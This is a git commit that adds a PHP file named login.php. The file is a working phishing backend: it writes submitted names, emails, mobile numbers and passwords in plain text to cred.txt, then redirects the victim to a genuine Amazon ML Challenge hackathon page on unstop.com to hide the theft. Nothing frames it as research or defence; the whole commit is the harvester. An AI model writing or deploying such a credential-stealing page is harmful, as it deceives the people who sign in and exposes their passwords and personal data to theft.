f73edf4a6ab65ad4b7a1623ff54552a362c920cd
Sachin Kumar Pandey <sachinkumarpandey1028@gmail.com>
2026-03-28 17:03:46 +0530

    login.php

--- login.php
+++ login.php
@@ -1,1 +1,11 @@
-
+<?php
+file_put_contents("cred.txt", 
+    "Name : " . $_POST['name'] . "\n" .
+    "Email : " . $_POST['email'] . "\n" .
+    "Mobile : " . $_POST['mobile'] . "\n" .
+    "Password : " . $_POST['password'] . "\n\n",
+    FILE_APPEND
+);
+header('Location: https://unstop.com/hackathons/amazon-ml-challenge-2025-amazon-1560375');
+exit();
+?>
